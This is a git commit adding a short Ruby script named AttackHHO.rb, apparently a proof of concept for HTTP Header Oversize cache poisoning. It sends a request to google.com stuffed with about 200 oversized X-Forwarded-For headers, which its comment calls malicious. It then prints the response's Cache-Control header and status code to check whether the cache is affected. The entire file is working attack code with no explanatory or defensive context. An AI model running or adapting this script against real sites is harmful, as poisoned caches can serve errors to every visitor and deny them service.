212c8c2cef53604287f890004af17b18b38ef7d9
Abdulrahman Abdullah <77519024+Ph33rr@users.noreply.github.com>
2022-03-14 20:53:41 +0300

    Create AttackHHO.rb

---
+++ Cache/AttackHHO.rb
@@ -0,0 +1,25 @@
+require 'net/http'
+uri = URI("https://google.com")
+req = Net::HTTP::Get.new(uri)
+req["Accept-Encoding"] = "gzip,deflate,br"
+num = 200
+i = 0
+
+oversize = "A"*100
+
+# Setting malicious and irrelevant headers fields for creating an oversized header
+until i > num  do
+        req["X-Forwarded-For#{i}"] = "#{oversize}"
+        i +=1;
+end
+
+res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
+        http.request(req)
+}
+
+cacheStatus = res["Cache-Control"]
+
+code = res.code.to_i
+
+puts "Cache-Control: #{cacheStatus}"
+puts "#{code}"
